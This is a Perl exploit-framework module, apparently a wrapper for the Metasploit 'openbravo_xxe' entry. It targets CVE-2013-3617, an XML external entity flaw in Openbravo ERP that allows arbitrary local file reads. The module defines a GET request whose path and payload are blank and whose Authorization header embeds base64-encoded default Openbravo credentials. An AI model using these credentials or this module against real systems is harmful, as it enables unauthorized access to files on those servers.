package OPENBRAVO::MSF::OpenbravoXxe;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "OpenbravoXxe";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-3617",
  DESCRIPTION => "

        The Openbravo ERP XML API expands external entities which can be defined as

        local files. This allows the user to read any files from the FS as the

        user Openbravo is running as (generally not root).



        This module was tested against Openbravo ERP version 3.0MP25 and 2.50MP6.

      ",
  MSF_MODULE => "openbravo_xxe",
  OSVDB => 99141,
  REFERENCES => [
    "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats",
  ],
  TITLE => "Openbravo ERP XXE Arbitrary File Read",


  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Authorization' => 'Basic T3BlbmJyYXZvOm9wZW5icmF2bw==',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
